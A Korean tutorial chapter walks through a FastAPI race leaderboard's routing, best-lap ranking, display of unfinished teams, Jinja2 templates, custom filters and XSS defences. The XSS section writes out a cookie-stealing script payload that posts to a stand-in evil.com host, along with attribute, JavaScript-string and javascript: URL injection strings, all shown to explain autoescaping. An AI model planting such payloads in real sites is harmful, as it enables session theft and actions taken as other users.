# 5단계. 조회와 표현 — `routers/leaderboard.py`, `records.py`, `render.py`, `templates/`

> 이 단계의 목표: **데이터를 화면으로 바꾸는 과정**을 이해하는 것.
> 라우팅 순서, 리다이렉트 설계, 정렬 알고리즘, 템플릿 엔진, 커스텀 필터, 그리고 **XSS**.
> 그리고 **"완주하지 못한 사람에게 무엇을 보여줄 것인가"** 라는 제품 설계 문제.

---

## 0. 서버 렌더링(SSR) vs SPA — 왜 이 선택인가

### 무엇을(What)

**[쉬움]**

| 방식 | 비유 |
|---|---|
| **서버 렌더링 (이 프로젝트)** | 식당에서 **완성된 요리**를 받는다. 접시째 나온다 |
| **SPA (React 등)** | **재료와 레시피**를 받아서 손님이 직접 조리한다 |

**[전공]**

```
SSR:  브라우저 → GET /leaderboard/1 → 서버가 HTML 완성 → 브라우저는 그리기만
SPA:  브라우저 → GET / → 빈 HTML + JS 번들
                → JS 실행 → GET /api/leaderboard/1 (JSON) → JS가 DOM 조립
```

| | SSR | SPA |
|---|---|---|
| 초기 로딩 | 빠름 (HTML 하나) | 느림 (JS 번들 다운로드+파싱) |
| 이후 상호작용 | 페이지 새로고침 | 부분 갱신, 부드러움 |
| 복잡도 | **낮음. 언어 하나** | 프론트/백 두 프로젝트, API 설계, 상태 관리 |
| JS 없이 | 동작함 | 아무것도 안 보임 |

### 왜 이 프로젝트는 SSR인가

1. **화면이 6개뿐이다** (리더보드, 시즌목록, 로그인, 제출, 관리자 대시보드/시즌상세)
2. **상호작용이 거의 없다.** 폼 제출과 링크 이동뿐
3. **개발자가 1명이다.** 프론트/백 분리는 그 자체로 비용
4. 실시간 갱신 요구가 없다 (spec에서 "새로고침으로 확인" 확정)

**`upload.js`가 유일한 예외인데, 그것도 "얹기만" 한다**(4단계 §4).
**SSR을 기본으로 하고 필요한 곳만 JS를 얹는 것** — 이 프로젝트의 일관된 전략이다.

> **[전공] 판단 기준**: "이 화면이 사용자와 초당 여러 번 상호작용하는가?"
> 아니면 SSR로 충분하다. 대시보드, 게시판, 관리 도구는 대부분 SSR이 맞다.

---

## 1. 진입점 설계 — 리다이렉트 체인

```python
@router.get("/")
def index():
    return RedirectResponse("/leaderboard", status_code=303)


@router.get("/leaderboard")
def leaderboard_entry(request: Request, db: Session = Depends(get_db)):
    open_season = get_open_season(db)
    if open_season is not None:
        return RedirectResponse(f"/leaderboard/{open_season.id}", status_code=303)
    return render_season_list(request, db)


@router.get("/leaderboard/seasons")     # ← 순서 주의
def season_list(request: Request, db: Session = Depends(get_db)):
    return render_season_list(request, db)


@router.get("/leaderboard/{season_id}")
def season_leaderboard(season_id: int, request: Request, db: Session = Depends(get_db)):
    ...
```

### 흐름

```
GET /
 └→ 303 → GET /leaderboard
            ├─ 진행중 시즌 있음 → 303 → GET /leaderboard/3  → 리더보드 표시
            └─ 없음 → 시즌 목록 표시 (리다이렉트 없이 직접 렌더)
```

### 왜 이렇게 설계했나

주석에 이유가 있다:
```python
"""대회 기간에는 매번 시즌을 고르지 않아도 되게, 진행중 시즌으로 바로 들어간다.
진행중 시즌이 없으면(전부 준비중/마감/아카이브) 지금까지처럼 시즌 목록을 보여준다."""
```

**[쉬움]** 대회 기간에는 참가자가 링크를 열면 **바로 지금 대회 순위**가 보여야 한다.

**[전공] 트레이드오프**

**장점**: 홍보 링크가 `/leaderboard` 하나로 고정된다. 시즌이 바뀌어도 링크를 안 바꿔도 된다.

**단점 — 왕복이 늘어난다.**
`/` 접속 시 HTTP 요청이 3번. 로컬에선 무시할 수준이지만,
**Caddy → 인터넷을 거치면 각 왕복이 수십~수백 ms다.**
`/`에서 바로 최종 URL로 보내도록 합칠 수 있다.

**진행중 시즌이 여러 개면?**
```python
def get_open_season(db: Session) -> Season | None:
    """지금 열려있는(진행중) 시즌. 운영상 한 번에 하나지만, 실수로 둘이 되어도
    화면이 흔들리지 않도록 가장 최근 시작한 시즌으로 결정한다."""
    return db.execute(
        select(Season).where(Season.status == SeasonStatus.ACTIVE)
        .order_by(Season.start_date.desc()).limit(1)
    ).scalar_one_or_none()
```

**`.limit(1)` + `scalar_one_or_none()` 조합에 주목.**
`limit(1)`이 없으면 2건일 때 예외 → **리더보드 전체가 500**.
`limit(1)`을 붙여 **"관리 실수가 있어도 화면은 뜬다"** 를 보장한다.

> **4단계의 `has_active_submission`과 정반대 판단이라는 점이 흥미롭다.**
> - `has_active_submission`: 2건이면 **터뜨린다** (불변식 위반이므로 알아야 함)
> - `get_open_season`: 2건이어도 **하나를 고른다** (공개 화면이 죽으면 안 됨)
>
> **같은 상황에서도 "누가 보는 화면인가"에 따라 실패 전략이 달라진다.**
> **내부 불변식은 시끄럽게, 공개 화면은 조용하게.**

### 라우트 순서 — 다시 한 번

```python
# 주의: `/leaderboard/{season_id}`보다 먼저 선언해야 한다. FastAPI는 선언 순서로
# 매칭하므로 뒤에 두면 "seasons"를 int로 파싱하려다 422가 난다.
```

**Starlette의 매칭 알고리즘**: `app.routes`를 **순서대로 순회**하며 첫 매칭을 쓴다.
경로 패턴의 "구체성"을 계산하지 않는다.

`/leaderboard/{season_id}` 가 먼저면:
```
GET /leaderboard/seasons
 → 패턴 매칭 성공, season_id = "seasons"
 → int 변환 실패 → 422 Unprocessable Entity
```

**왜 404가 아니라 422인가?** 라우트는 **찾았고**, 파라미터 검증에서 실패했기 때문이다.

**더 나은 대안**: 애초에 충돌하지 않게 설계한다 (`/seasons` 를 최상위로).
**순서 의존성은 리팩터링 때 깨지기 쉽다.**

---

## 2. `records.py` — 최고기록 알고리즘

```python
def get_team_best(team: Team) -> tuple[Submission | None, "EvaluationResult | None"]:
    best_submission: Submission | None = None
    best_result = None

    for submission in team.submissions:
        if submission.status != SubmissionStatus.DONE or submission.result is None:
            continue
        result = submission.result
        if result.finish_status != FinishStatus.FINISHED:
            continue

        is_better = best_result is None or (
            result.lap_time_seconds < best_result.lap_time_seconds
            or (
                result.lap_time_seconds == best_result.lap_time_seconds
                and submission.submitted_at < best_submission.submitted_at
            )
        )
        if is_better:
            best_submission = submission
            best_result = result

    return best_submission, best_result
```

### 필터 3단계 — 각각 왜 필요한가

1. **`DONE`이 아닌 것 제외**: `queued`/`running`은 결과가 없고, `error`는 유효하지 않다
2. **`result is None` 제외**: 이론상 불가능하지만 **방어**
3. **미완주(`TIMEOUT`) 제외**: 3바퀴를 못 돈 기록은 랩타임이 `None`이다.
   **이걸 빼먹으면 `None < 3.5` 비교에서 `TypeError`가 난다** — 리더보드 전체가 500

> **`lap_time_seconds`가 `nullable=True`인 이유가 여기 있다.**
> 미완주는 랩타임이 존재하지 않는다. 0으로 채우면 **0초 기록이 1등**이 된다.
> `None`이 의미상 정확하고, 대신 **읽는 쪽이 반드시 걸러야 한다.**

### 동점 처리 — 왜 "먼저 세운 쪽"인가

**[쉬움]** 똑같이 10.00초면, **먼저 해낸 팀**이 위. 스포츠의 일반적 관례다.

**[전공]**
`plan.md §5.2`에서 확정된 규칙. 이 조건이 없다면
**순회 순서에 따라 결과가 달라진다** — 새로고침할 때마다 순위가 흔들릴 수 있다.

**결정론(determinism)이 중요한 이유**: 참가자가 "아까는 우리가 3등이었는데?"라고 하면 답이 없다.
**정렬은 항상 전순서(total order)여야 한다.**

**부동소수점 함정**: `lap_time_seconds`는 `float`이다. `==` 비교가 안전한가?
```python
# worker/drfc.py:351-352
total_ms = sum(t["elapsed_time_in_milliseconds"] for t in completed[:required_laps])
return "finished", total_ms / 1000.0, off_track_total
```
`total_ms`는 **정수**다. 같은 정수 밀리초면 정확히 같은 float가 나온다. **`==`가 안전하다.**

**하지만 일반적으로는 위험한 패턴이다.** `0.1 + 0.2 != 0.3`.
> 더 안전하게 하려면 랩타임을 **정수 밀리초로 저장**하고 표시할 때만 나눈다.
> 금액 계산에서 정수 '원' 단위를 쓰는 것과 같은 원리.

### 이 함수가 두 곳에서 재사용되는 것

```python
# app/routers/leaderboard.py:43
best_submission, best_result = get_team_best(team)

# app/retention.py:59
best_submission, _ = get_team_best(team)
```

**리더보드 표시**와 **파일 보존 정책**이 같은 함수를 쓴다.

**이게 왜 중요한가?**
두 곳이 각자 계산했다면, 규칙이 어긋나는 순간
**리더보드에 표시되는 영상 파일이 삭제되는 버그**가 난다.
docstring이 그 의도를 밝힌다:
> 팀의 '최고기록'을 계산하는 공용 로직 — 리더보드 조회와 시즌 아카이브에서 함께 쓴다.

**단일 진실 공급원(single source of truth)** 의 실전 예시다.

---

## 3. **`_best_attempt` — 완주 못 한 팀에게 무엇을 보여줄까**

```python
def _best_attempt(team: Team):
    """완주하지 못한 팀의 시도 중 가장 멀리 간 결과를 고른다.

    진행률이 기록되지 않은 예전 결과(NULL)만 있으면 None을 돌려주고, 화면은 그때
    진행률 없이 표시한다.
    """
    attempts = [
        s.result
        for s in team.submissions
        if s.status == SubmissionStatus.DONE
        and s.result is not None
        and getattr(s.result, "best_progress_percent", None) is not None
    ]
    if not attempts:
        return None
    return max(attempts, key=lambda r: r.best_progress_percent)
```

### 왜(Why) — 제품 설계 문제

**[쉬움]**
예전에는 완주 못 한 팀에게 **팀 이름과 제출 횟수만** 보여줬다.
그럼 참가자는 이런 생각을 한다:

> "우리 모델이 얼마나 부족한 거지? 거의 다 갔나? 아니면 출발도 못 했나?
>  다른 팀은 어디까지 갔지?"

**아무것도 알 수 없다.** 개선할 방향도 안 잡힌다.

이제는 **"완주 실패 (67.8%) · 차량이 멈춤"** 처럼 보여준다.
- 67.8%면 **거의 다 갔다** → 조금만 더 다듬으면 된다
- 12%면 **초반에 문제가 있다** → 보상 함수를 크게 손봐야 한다

**[전공]**
2단계에서 본 `best_progress_percent` / `failure_reason` 컬럼이 여기서 쓰인다.
DB 스키마 변경 → 워커의 값 추출 → 표현 필터 → 화면. **한 기능이 4개 층을 관통한다.**

### 어떻게(How) — 3가지 설계 결정

**결정 1: 최고 진행률 하나만 고른다**
```python
return max(attempts, key=lambda r: r.best_progress_percent)
```
모든 시도를 보여주면 표가 복잡해지고, 참가자가 알고 싶은 건 **"우리 최고 기록"** 이다.
완주 팀에게 "최고 랩타임"을 보여주는 것과 **같은 원리**다.

**결정 2: `best_progress_percent`가 있는 것만 후보로 삼는다**
```python
and getattr(s.result, "best_progress_percent", None) is not None
```
없는 결과(옛 데이터)를 넣으면 `max()`의 key 함수가 `None`을 만나 `TypeError`.
**§2의 필터 3번과 정확히 같은 이유다** — nullable 컬럼은 읽는 쪽이 걸러야 한다.

**결정 3: 하나도 없으면 `None`**
```python
if not attempts:
    return None
```
템플릿이 그때 "—"를 표시한다:
```jinja
<td>{% if row.best_attempt %}{{ row.best_attempt | failure_summary }}{% else %}—{% endif %}</td>
```
**옛 데이터가 있어도 화면이 안 깨진다.** (2단계 §10 하위 호환)

### `getattr(..., None)` 을 쓰는 이유

`s.result.best_progress_percent` 로 직접 접근해도 된다.
**방어적이지만, `render.py`의 `failure_summary`와 일관된 스타일이다.**
표현 계층이 데이터 결함으로 페이지를 죽이면 안 된다는 판단.

---

## 4. `build_leaderboard` — 정렬과 분류

```python
def build_leaderboard(db: Session, season: Season):
    teams = db.execute(
        select(Team).where(Team.season_id == season.id, Team.disqualified.is_(False))
    ).scalars().all()

    ranked = []
    unranked = []

    for team in teams:
        best_submission, best_result = get_team_best(team)
        total_submissions = sum(1 for s in team.submissions if s.status == SubmissionStatus.DONE)

        if best_result is not None:
            video_url = f"/media/videos/{best_result.video_path}" if best_result.video_path else None
            ranked.append({
                "team": team,
                "lap_time": best_result.lap_time_seconds,
                "achieved_at": best_submission.submitted_at,
                "total_submissions": total_submissions,
                "video_url": video_url,
            })
        else:
            # 완주 기록이 없는 팀에게도 "어디까지 갔는지"는 보여준다. 아무 정보도 없으면
            # 참가자가 자기 모델이 어느 정도인지 가늠할 수 없다.
            unranked.append({
                "team": team,
                "total_submissions": total_submissions,
                "best_attempt": _best_attempt(team),
            })

    # 랩타임 오름차순(가장 빠른 팀이 1위). 완전히 같은 랩타임이면 그 기록을 먼저 세운
    # 팀이 상위 — plan.md §5.2.
    ranked.sort(key=lambda row: (row["lap_time"], row["achieved_at"]))
    return ranked, unranked
```

### 4-1. `Team.disqualified.is_(False)` — `== False`가 아닌 이유

**[전공]**
SQLAlchemy에서 `Team.disqualified == False` 는 린터가 경고한다(`E712`). 그리고 NULL 처리가 다르다:
```sql
WHERE disqualified = false   -- NULL인 행은 제외됨 (NULL = false는 NULL)
WHERE disqualified IS false  -- 명시적
```
`disqualified`는 `NOT NULL`이라 실질 차이는 없지만 **관례적으로 옳은 표현**이다.

### 4-2. **실격팀은 리더보드에서 "조용히 사라진다"**

`WHERE ... disqualified = false` 로 **아예 조회하지 않는다.**

spec 확정 사항:
> 실격/부정 제출은 리더보드에서 조용히 사라지고 사유 비공개

**[전공] 설계 관점**
- 실격 사유를 공개하면 분쟁이 생긴다
- "실격됨"이라고 표시하면 그것 자체가 낙인이다
- 데이터는 남기고 **표시만 안 한다** (soft hide)

**단, 실격팀도 로그인해서 `/submit`에는 갈 수 있다.** 그때는 명확히 알려준다:
```python
if team.disqualified:
    return redirect_with_error("실격 처리된 팀은 제출할 수 없습니다.")
```
**공개 화면에서는 숨기고, 당사자에게는 알린다.** 정확한 처리다.

### 4-3. `ranked` / `unranked` 분리

**왜 나누나?** 미완주 팀은 랩타임이 없어 **정렬할 수 없다.**
- `None`을 정렬하면 `TypeError`
- 999초 같은 값을 넣으면 "999초 기록"으로 오해받는다
- 맨 아래에 넣어도 "순위 15등"이라는 숫자가 붙는다

`leaderboard.html`에서 별도 테이블로 렌더한다 — **순위 컬럼이 없다.**

**미완주 표에도 이제 정보가 하나 늘었다:**
```jinja
<thead><tr><th>팀</th><th>제출 횟수</th><th>최고 기록</th></tr></thead>
```

> **[전공] "순위 없음"과 "정보 없음"은 다르다.**
> 순위를 못 매기는 것과 아무것도 안 알려주는 것은 별개 문제다.
> `_best_attempt`가 그 구분을 만들어냈다.

### 4-4. **튜플 정렬 키 — 파이썬의 사전식 비교**

```python
ranked.sort(key=lambda row: (row["lap_time"], row["achieved_at"]))
```

**[쉬움]**
사전에서 단어를 찾듯이, **첫 글자를 먼저 보고, 같으면 둘째 글자**를 본다.
여기선 "랩타임 먼저, 같으면 달성 시각".

**[전공]**
```python
(10.5, t1) < (10.5, t2)   →  10.5 == 10.5 이므로  t1 < t2 를 비교
(10.4, t1) < (10.5, t2)   →  10.4 < 10.5 로 끝. t는 안 봄
```

**`sort()`는 안정 정렬(Timsort)이다** — 같은 키의 원래 순서가 보존된다.
그런데 여기선 튜플 두 번째 요소로 이미 전순서를 만들었으므로 **안정성에 의존하지 않는다.**
**의존하지 않는 게 좋다** — 나중에 정렬 방식을 바꿔도 결과가 안 변한다.

**혼합 방향이 필요하면** `-`를 쓰거나 여러 번 정렬한다(안정 정렬을 이용).

### 4-5. `total_submissions` — 무엇을 세는가

```python
total_submissions = sum(1 for s in team.submissions if s.status == SubmissionStatus.DONE)
```

주석:
```python
# 평가가 실제로 끝난 제출만 센다 — 업로드 오류나 시스템 오류(ERROR)는
# 팀의 시도로 보기 어렵고, 하루 제출 한도 카운트 기준과도 일치한다.
```

**하루 한도 카운트 기준(`quota.py`)과 일치시킨 것이 핵심이다.**
어긋나면 참가자가 "리더보드엔 3회인데 왜 오늘 2회밖에 못 쓰지?" → 신뢰가 깨진다.

**[전공] `sum(1 for ...)` vs `len([...])`**: 제너레이터는 리스트를 안 만든다. **관용적이다.**

### 4-6. `video_url` 조립

```python
video_url = f"/media/videos/{best_result.video_path}" if best_result.video_path else None
```

`video_path`는 상대 경로: `"1/6/17.mp4"` → `/media/videos/1/6/17.mp4`
→ `main.py`의 `app.mount("/media/videos", StaticFiles(...))`가 처리

**`video_path`가 `None`일 수 있는 세 경우:**
1. 워커가 쓸 만한 영상 앵글을 못 찾음 (`drfc.download_video`가 `None`)
2. **워커가 영상을 웹에 못 올림** (`transfer.deliver_video`가 `None` — http 모드)
3. **보존 정책으로 파일을 지우면서 경로를 비웠다**
```python
# app/retention.py:47-48
if _remove(videos_dir / result.video_path):
    removed += 1
result.video_path = None      # ← 파일을 지웠으니 경로도 비운다
```

**파일은 지웠는데 경로만 남으면 깨진 링크**가 된다. `retention.py` 주석이 지적한다:
> 영상은 지운 뒤 `video_path`를 비운다 — 파일이 없는데 경로만 남으면 나중에 깨진 링크가 된다.

템플릿:
```jinja
<td>{% if row.video_url %}<a href="{{ row.video_url }}" target="_blank">보기</a>{% else %}—{% endif %}</td>
```

### 4-7. **왜 SQL이 아니라 파이썬에서 계산하는가**

| | 파이썬 (현재) | SQL |
|---|---|---|
| 쿼리 수 | N+1 (수십~수백) | 1 |
| 가독성 | **높음.** 규칙이 파이썬으로 읽힘 | 낮음. window function 필요 |
| 테스트 | **쉬움.** `get_team_best`는 순수 함수 | DB 필요 |
| 재사용 | **쉬움.** retention.py와 공유 | 어려움 |

`plan.md §4`의 판단: "규모(시즌당 약 10팀)가 작아 별도 캐시 테이블 없이 즉시 계산한다"

**이 판단이 옳은 이유**: 최적화의 정석은 **"측정 없이 최적화하지 마라"**.
팀 10개 × 제출 70건 = 700행. 수십 ms.
**가독성과 재사용성이 압도적으로 이긴다.**

> **다만 `_best_attempt`가 추가되면서 `team.submissions` 순회가 한 번 더 늘었다.**
> 이미 로드된 컬렉션을 다시 도는 것이라 쿼리는 안 늘지만,
> **N+1 자체는 그대로다.** 규모가 커지면 `selectinload`가 첫 처방이다(2단계 §11).

---

## 5. Jinja2 템플릿 — HTML을 만드는 방법

### 5-1. `TemplateResponse` 호출 방식 (2.0 스타일)

```python
return templates.TemplateResponse(
    request,                                    # ← 첫 인자가 request
    "leaderboard.html",
    {"season": season, "ranked": ranked, "unranked": unranked,
     "worker_status": get_worker_status(db)},
)
```

**옛 방식(deprecated)**: `TemplateResponse("x.html", {"request": request, ...})`
컨텍스트 dict 안에 `request`를 넣어야 했다. **까먹으면 런타임 에러.**

`render.py`가 `Jinja2Templates` 인스턴스를 한 곳에서 만들어 공유한다(1단계 §5).

### 5-2. 템플릿 상속

`base.html`:
```jinja
<title>{% block title %}SPG DeepRacer{% endblock %}</title>
...
<main>
  {% block content %}{% endblock %}
</main>
{% block scripts %}{% endblock %}
```

`leaderboard.html`:
```jinja
{% extends "base.html" %}
{% block title %}{{ season.name }} 리더보드{% endblock %}
{% block content %}
...
{% endblock %}
```

**[쉬움]** 액자(base)는 하나 만들어두고, 그림(content)만 갈아 끼운다.

**[전공]**
- 헤더/네비게이션/CSS 링크가 한 곳에만 존재 → 바꿀 때 한 곳만
- **동작 원리**: Jinja는 `extends`를 만나면 자식을 먼저 파싱해 블록 맵을 만들고,
  부모를 렌더하면서 블록 자리에 자식 것을 끼운다. **부모가 바깥, 자식이 안쪽**

**`{% block scripts %}` 가 `</body>` 직전에 있는 이유**:
```jinja
{# submit.html:89-91 #}
{% block scripts %}
{% if can_submit %}<script src="/static/upload.js" defer></script>{% endif %}
{% endblock %}
```
- 스크립트가 필요한 화면만 로드한다
- `</body>` 직전이라 DOM이 이미 파싱된 상태 (게다가 `defer`까지)
- **다른 화면(리더보드 등)은 이 블록이 비어 있어 JS를 하나도 안 내려받는다**

### 5-3. `{% include %}` — 재사용 조각

```jinja
{% include "_worker_status.html" %}
```

`submit.html`과 `leaderboard.html` **두 곳**에서 같은 배너를 쓴다.

| | 방향 | 용도 |
|---|---|---|
| `extends` | 자식이 부모의 블록을 채운다 | 레이아웃 |
| `include` | 현재 위치에 다른 파일을 끼워넣는다 | 재사용 조각 |

**include된 템플릿은 부모의 컨텍스트를 그대로 본다** — `worker_status`를 따로 안 넘겨도 된다.

**`_` 접두사**는 "단독 렌더용이 아니라 조각"이라는 관례적 표시다.

### 5-4. **조건부 네비게이션 — 은닉이 화면까지 이어진다**

```jinja
{# app/templates/base.html:12-18 #}
<nav>
  <a href="/leaderboard">리더보드</a>
  <a href="/submit">모델 제출</a>
  {# 관리자로 로그인한 세션에서만 보인다. 참가자·관전자에게는 진입점 자체를 노출하지 않는다
     (admin-access-hardening.md §3.5). 관리자는 로그인 후 비밀 경로를 다시 칠 필요가 없다. #}
  {% if request.session.get('admin_id') %}<a href="/admin">관리자</a>{% endif %}
</nav>
```

**[전공] 여기서 두 가지를 배울 수 있다.**

**(1) 템플릿에서 `request`를 직접 쓴다.**
`TemplateResponse(request, ...)` 로 넘긴 `request`가 컨텍스트에 자동으로 들어간다.
그래서 라우터가 `is_admin` 같은 값을 매번 계산해 넘길 필요가 없다.

**(2) "표시"와 "강제"의 분리 (3단계 §2와 같은 주제)**
이 조건은 **DB를 확인하지 않는다.** 세션에 `admin_id`가 있기만 하면 링크가 뜬다.
- 링크가 잘못 보여도 → `/admin` 접근 시 `get_current_admin`이 DB로 막는다
- 매 페이지마다 DB를 한 번 더 치는 비용을 아낀다

**테스트가 이 조건을 고정한다:**
```python
def test_비로그인_방문자에게는_관리자_링크가_안_보인다()
def test_참가팀으로_로그인해도_관리자_링크는_안_보인다()
def test_관리자로_로그인하면_관리자_링크가_보인다()
```

**테스트 방법이 영리하다** — DB 없이 템플릿만 렌더한다:
```python
class _가짜요청:
    """base.html이 쓰는 request.session만 흉내 낸다."""
    def __init__(self, session: dict):
        self.session = session

def _네비게이션(session: dict) -> str:
    from app.render import templates
    return templates.get_template("base.html").render(request=_가짜요청(session))
```

> **[전공] 이게 덕 타이핑(duck typing)의 실용적 활용이다.**
> 템플릿이 `request`에서 실제로 쓰는 건 `session` 하나뿐이므로,
> **그것만 가진 가짜 객체면 충분하다.**
> 진짜 `Request`를 만들려면 ASGI scope를 조립해야 해서 훨씬 번거롭다.

### 5-5. **커스텀 필터 `failure_summary` — 표현 로직의 자리**

```jinja
{# leaderboard.html:33 — 미완주 표 #}
<td>{% if row.best_attempt %}{{ row.best_attempt | failure_summary }}{% else %}—{% endif %}</td>

{# submit.html:78 — 최근 제출 결과 #}
<p>{{ latest_submission.result | failure_summary }}</p>
<p class="muted">{{ eval_laps }}바퀴를 모두 완주해야 기록으로 인정됩니다.</p>
```

필터 본체는 `render.py`에 있다(1단계 §5):
```python
def failure_summary(result) -> str:
    """완주하지 못한 결과를 '완주 실패 (67.8%) · 차량이 멈춤' 형태로 표현한다.

    예전에는 모든 실패를 "미완주 (시간 초과)"로 표시해, 실제로는 차가 트랙 중간에
    멈춘 경우에도 참가자가 시간 초과로 오해했다 (2026-07-30 submission 18).
    """
```

### 왜 필터인가 — 라우터에서 문자열을 만들면 안 되나

가능하다. 하지만:

| 방법 | 문제 |
|---|---|
| 라우터가 문자열 조립 | **두 라우터**(submissions, leaderboard)가 같은 로직을 갖게 됨 |
| 템플릿에서 `{% if %}` 로 조립 | 템플릿이 지저분해지고 **두 템플릿에 중복** |
| **커스텀 필터** | 한 곳에 정의, 어디서나 `\| failure_summary` |

> **[전공] "데이터는 라우터, 표현은 템플릿" 경계를 지키면서 중복을 없애는 방법이 필터다.**
> 필터는 **표현 계층에 속한 재사용 가능한 함수**다.

**Jinja 필터 문법의 의미**: `{{ x | foo(a) }}` 는 `foo(x, a)` 로 호출된다.
`templates.env.filters["failure_summary"] = failure_summary` 한 줄로 등록된다.

### 모르는 값을 감추지 않는 설계

```python
FAILURE_REASON_LABELS = {
    "immobilized": "차량이 멈춤",
    "off_track": "트랙 이탈",
    ...
}
# 이 표에 없는 값은 원문을 그대로 보여준다 — 모르는 사유를 감추면 원인 추적이 어려워진다.
parts.append(FAILURE_REASON_LABELS.get(reason, reason))
```

`dict.get(key, default)` 에서 **기본값이 `reason` 자기 자신**이다.

**[쉬움]**
번역할 줄 모르는 단어가 나왔다고 그냥 지워버리면, 읽는 사람은 **정보가 있었다는 것도 모른다.**
번역 못 하면 원문이라도 보여준다.

**[전공]**
DRFC가 새 상태 값을 추가하면 화면에 영어 원문이 뜬다. **보기엔 안 예쁘다.**
하지만:
- 참가자가 그 값을 검색해서 의미를 찾을 수 있다
- 운영자가 "아, 이런 값도 있구나" 하고 표에 추가할 수 있다

**"모르면 감춘다"** 를 택했다면 그 사유는 영원히 발견되지 않는다.
이게 2단계에서 본 **"외부 시스템의 값은 문자열로 받고 표시할 때만 번역"** 원칙의 완성이다.

---

## 6. **자동 이스케이프와 XSS — 이 단계의 핵심 보안 주제**

### 공격 시나리오

관리자가 팀을 등록할 때 팀명을 이렇게 넣으면?
```
<script>fetch('https://evil.com/?c='+document.cookie)</script>
```

이스케이프가 없다면 렌더 결과:
```html
<td><script>fetch('https://evil.com/?c='+document.cookie)</script></td>
```
→ **리더보드를 여는 모든 사람의 브라우저에서 스크립트가 실행된다.**
→ 관리자가 열면 관리자 세션 쿠키가 탈취된다 (**Stored XSS** — 가장 위험한 유형)

**우리 상황에서 특히 치명적인 이유**: 3단계에서 은닉과 잠금으로 관리자 진입을 막았는데,
**XSS 하나면 그 전부가 무의미해진다.** 이미 로그인한 관리자의 쿠키를 훔치면 되니까.
(다행히 쿠키가 `HttpOnly`라 JS로는 못 읽는다 — 하지만 XSS는 쿠키를 안 훔쳐도
**관리자 권한으로 요청을 보낼 수 있다.**)

### Jinja2의 방어

`Jinja2Templates`는 `autoescape=True`가 기본이다.
```jinja
{{ row.team.name }}
```
→ 렌더 시 5개 문자를 HTML 엔티티로 변환:

| 원본 | 변환 |
|---|---|
| `<` | `&lt;` |
| `>` | `&gt;` |
| `&` | `&amp;` |
| `"` | `&#34;` |
| `'` | `&#39;` |

→ 브라우저는 이걸 **텍스트로 표시**한다. 실행 안 된다.

### **이스케이프를 무력화하는 방법 (절대 하지 말 것)**

```jinja
{{ user_input | safe }}          ← 이스케이프 끄기
{% autoescape false %}...{% endautoescape %}
```
```python
from markupsafe import Markup
Markup(user_input)               ← "이건 안전한 HTML이야"라고 거짓말
```

**현재 코드에 `|safe`가 하나도 없다.** 좋은 상태다.

**`failure_summary` 필터도 안전한가?**
```python
return " · ".join(parts)          # 평범한 str 반환
```
`Markup`이 아니라 **일반 문자열**을 반환하므로 **자동 이스케이프 대상**이다.
`failure_reason`에 `<script>`가 들어있어도 이스케이프된다. ✅

> **[전공] 커스텀 필터를 만들 때 주의할 점이다.**
> `Markup(...)`을 반환하면 **그 값은 이스케이프를 건너뛴다.**
> 필터 안에서 HTML 태그를 만들고 싶은 유혹이 생기는데(`<b>67.8%</b>` 같은),
> 그 순간 XSS 책임이 필터로 넘어온다. **지금처럼 평문을 반환하는 것이 안전하다.**

### **자동 이스케이프가 막지 못하는 곳**

**HTML 텍스트 노드는 안전하지만, 다른 문맥은 안전하지 않다:**

```jinja
<!-- 1. 속성값 — 따옴표가 없으면 위험 -->
<div class={{ x }}>              ← x = "a onmouseover=alert(1)" 이면 뚫림
<div class="{{ x }}">            ← 따옴표가 있으면 " 가 이스케이프되어 안전

<!-- 2. JavaScript 안 — 완전히 다른 문맥 -->
<script>var name = "{{ x }}";</script>
   ← x = "; alert(1); //  이면 뚫림. HTML 이스케이프는 JS 문자열을 보호하지 않는다

<!-- 3. URL 안 — 스킴 검증이 필요 -->
<a href="{{ url }}">             ← url = "javascript:alert(1)" 이면 클릭 시 실행

<!-- 4. CSS 안 -->
<style>body { background: {{ x }} }</style>
```

**우리 코드는 어떤가?**

```jinja
<!-- leaderboard.html -->
<td>{{ row.team.name }}</td>                          ✅ 텍스트 노드
<a href="{{ row.video_url }}" target="_blank">         ⚠️ URL 문맥
<td class="{{ 'rank-1' if loop.index==1 else ... }}">  ✅ 서버가 만든 고정 문자열

<!-- submit.html -->
<form ... data-max-bytes="{{ upload_max_bytes }}"      ✅ 서버 설정값(정수)
      data-allowed-ext="{{ allowed_extensions|join(',') }}">  ✅ 서버 설정값

<!-- admin/login.html -->
<form method="post" action="{{ admin_login_path }}">   ⚠️ URL 문맥 (설정에서 옴)
```

**`href="{{ row.video_url }}"` 는 위험한가?**
```python
video_url = f"/media/videos/{best_result.video_path}"
video_rel_path = f"{season_id}/{team_id}/{submission.id}.mp4"
```
**전부 DB의 정수 ID로 조립된다. 사용자 입력이 안 들어간다.** → 안전하다.

**`action="{{ admin_login_path }}"` 는?**
`.env`에서 오고 `field_validator`가 정규화한다(1단계 §3-5).
**운영자만 설정할 수 있는 값이라 신뢰 경계 안쪽이다.** → 안전하다.

**하지만 둘 다 "우연히 안전"에 가깝다.** 나중에 파일명을 사용자 입력에서 가져오면
`javascript:` 스킴 주입이 가능해진다. **URL을 템플릿에 넣을 때는 스킴을 확인하는 습관**이 필요하다.

**`target="_blank"` 의 부수적 문제**: `rel="noopener noreferrer"` 가 없다.
현대 브라우저는 `_blank`에 암묵적으로 `noopener`를 적용하지만, **명시하는 게 안전하다.**

### `data-*` 속성이 안전한 이유 (4단계와 연결)

```jinja
data-max-bytes="{{ upload_max_bytes }}"
```
따옴표 안이고 자동 이스케이프가 적용된다.
JS는 `getAttribute`로 읽으므로 **DOM API를 통과하며 문자열로만 취급**된다.

**반면 인라인 스크립트라면:**
```jinja
<script>var MAX = {{ upload_max_bytes }};</script>   ← JS 문맥! 위험
```
**여기가 4단계에서 "인라인 JS보다 `data-*`가 낫다"고 한 이유 중 하나다.**

---

## 7. 템플릿 문법 정독

```jinja
{% for row in ranked %}
<tr>
  <td class="{{ 'rank-1' if loop.index==1 else ('rank-2' if loop.index==2 else ('rank-3' if loop.index==3 else '')) }}">{{ loop.index }}</td>
  <td>{{ row.team.name }}</td>
  <td>{{ "%.2f"|format(row.lap_time) }}초</td>
  <td>{{ row.total_submissions }}</td>
  <td>{% if row.video_url %}<a href="{{ row.video_url }}" target="_blank">보기</a>{% else %}—{% endif %}</td>
</tr>
{% endfor %}
```

**`loop.index`**: Jinja의 특수 변수. **1부터 시작**한다(`loop.index0`은 0부터).

**`{{ "%.2f"|format(row.lap_time) }}`**: 파이썬 `%` 포매팅을 필터로.
